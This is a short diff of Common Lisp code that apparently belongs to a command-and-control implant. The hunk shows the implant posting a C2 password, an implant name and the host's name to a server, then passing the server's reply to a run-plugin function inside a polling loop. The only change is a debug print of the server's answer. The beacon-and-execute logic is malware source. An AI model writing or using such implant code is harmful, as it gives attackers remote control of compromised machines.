@@ -28,8 +28,9 @@
                          :method :post 
                          :parameters (pairlis '("client_password" "implantname") (list *c2password* (get-hostname))))
                                        ))
-    (format t "~a~%" resposnse)
-    (run-plugin resposnse)))
+    (format t "ANSWER FROM SERVER: ~a~%" resposnse)
+    (run-plugin resposnse)
+    ))
 
 (defun runner ()
   (loop
